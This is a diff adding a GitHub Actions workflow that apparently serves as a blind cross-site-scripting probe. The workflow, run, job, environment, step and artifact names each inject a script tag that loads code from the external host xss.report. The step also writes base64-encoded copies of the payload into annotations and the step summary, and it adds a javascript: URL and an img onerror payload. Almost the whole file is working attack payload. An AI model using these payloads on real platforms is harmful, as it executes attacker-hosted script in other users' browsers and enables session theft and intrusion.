@@ -1,0 +1,27 @@
+name: "canary '\"><script src=//xss.report/c/abfex?f=act_wfname></script>"
+run-name: "RUNNAME '\"><script src=//xss.report/c/abfex?f=act_runname></script>"
+on: workflow_dispatch
+jobs:
+  jobone:
+    name: "JOBNAME '\"><script src=//xss.report/c/abfex?f=act_jobname></script>"
+    runs-on: ubuntu-latest
+    environment:
+      name: "ENV '\"><script src=//xss.report/c/abfex?f=act_envname></script>"
+      url: "javascript:alert(document.domain)//"
+    steps:
+      - name: "STEPNAME '\"><script src=//xss.report/c/abfex?f=act_stepname></script>"
+        run: |
+          ACT_ANNTITLE=$(echo JyI+PHNjcmlwdCBzcmM9Ly94c3MucmVwb3J0L2MvYWJmZXg/Zj1hY3RfYW5udGl0bGU+PC9zY3JpcHQ+ | base64 -d)
+          ACT_ANNBODY=$(echo JyI+PHNjcmlwdCBzcmM9Ly94c3MucmVwb3J0L2MvYWJmZXg/Zj1hY3RfYW5uYm9keT48L3NjcmlwdD4= | base64 -d)
+          ACT_ANNERR=$(echo JyI+PHNjcmlwdCBzcmM9Ly94c3MucmVwb3J0L2MvYWJmZXg/Zj1hY3RfYW5uZXJyPjwvc2NyaXB0Pg== | base64 -d)
+          ACT_STEPSUMMARY=$(echo JyI+PHNjcmlwdCBzcmM9Ly94c3MucmVwb3J0L2MvYWJmZXg/Zj1hY3Rfc3RlcHN1bW1hcnk+PC9zY3JpcHQ+ | base64 -d)
+          echo "::notice title=NT${ACT_ANNTITLE}::BODY${ACT_ANNBODY}"
+          echo "::error ::ERR${ACT_ANNERR}"
+          echo "SUMMARY ${ACT_STEPSUMMARY}" >> $GITHUB_STEP_SUMMARY
+          echo '<img src=x onerror=alert(1)>' >> $GITHUB_STEP_SUMMARY
+          mkdir -p art && echo canary > art/f.txt
+      - uses: actions/upload-artifact@v4
+        continue-on-error: true
+        with:
+          name: "ART'\"><script src=//xss.report/c/abfex?f=act_artifact></script>"
+          path: art
